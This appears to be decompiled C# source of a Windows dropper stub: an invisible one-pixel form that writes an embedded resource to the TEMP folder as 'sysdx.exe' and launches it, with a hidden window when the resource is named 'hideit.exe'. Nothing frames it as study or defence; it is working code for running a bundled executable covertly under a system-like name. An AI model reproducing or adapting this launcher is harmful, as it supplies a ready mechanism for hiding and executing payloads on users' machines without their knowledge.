using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace Launch;

internal class Form1 : Form
{
	private IContainer components;

	private bool hide;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1, 1));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1(string[] args)
	{
		InitializeComponent();
		((Control)this).set_Visible(false);
		extract();
		start(args);
	}

	private string buildargument(string[] args)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < args.Length; i++)
		{
			stringBuilder.Append(args[i] + " ");
		}
		return stringBuilder.ToString();
	}

	private void extract()
	{
		string text = Assembly.GetExecutingAssembly().GetManifestResourceNames()[0];
		hide = text.EndsWith("hideit.exe");
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text);
		BinaryReader binaryReader = new BinaryReader(manifestResourceStream);
		FileStream fileStream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\sysdx.exe", FileMode.Create);
		byte[] array = new byte[manifestResourceStream.Length];
		manifestResourceStream.Read(array, 0, array.Length);
		fileStream.Write(array, 0, array.Length);
		binaryReader.Close();
		fileStream.Close();
	}

	private void start(string[] args)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\sysdx.exe";
		processStartInfo.Arguments = buildargument(args);
		processStartInfo.CreateNoWindow = hide;
		if (hide)
		{
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		}
		processStartInfo.WorkingDirectory = Application.get_StartupPath();
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Application.Exit();
	}
}
